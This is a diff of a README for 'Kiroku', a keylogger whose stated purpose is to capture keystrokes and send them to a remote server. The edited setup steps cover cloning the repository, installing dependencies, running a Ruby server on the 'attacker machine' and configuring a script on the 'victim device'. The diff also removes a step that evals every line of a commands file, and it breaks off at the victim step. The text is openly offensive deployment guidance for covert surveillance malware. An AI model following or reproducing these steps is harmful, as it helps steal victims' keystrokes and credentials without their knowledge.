@@ -12,23 +12,18 @@ Kiroku keylogger designed to capture keystrokes and send them to a remote server
 
 - **Clone the repository:**
   ```bash
-  git clone https://github.com/z33phyr/Maori
+  git clone https://github.com/z33phyr/Kiroku
   ```
 
 - **Install the necessary libraries:**
   ```bash
-  pip3 install pynput requests
-  ```
+  pip3 install -r requirements.txt
 
-- **Run the commands in the commands.txt:**
+_ **On the attacker machine, run the server:**
   ```bash
-  while IFS= read -r command; do eval "$command"; done < commands.txt
+  ruby server.rb
   ```
-
-- **On the attacker device run the server:**
-  ```bash
-  node server.js
-  ```
+  *If ruby is not installed, install it using 'sudo apt install ruby-full ruby'*
 
 - **On the victim device configure the script and run the script:**
   ```bash
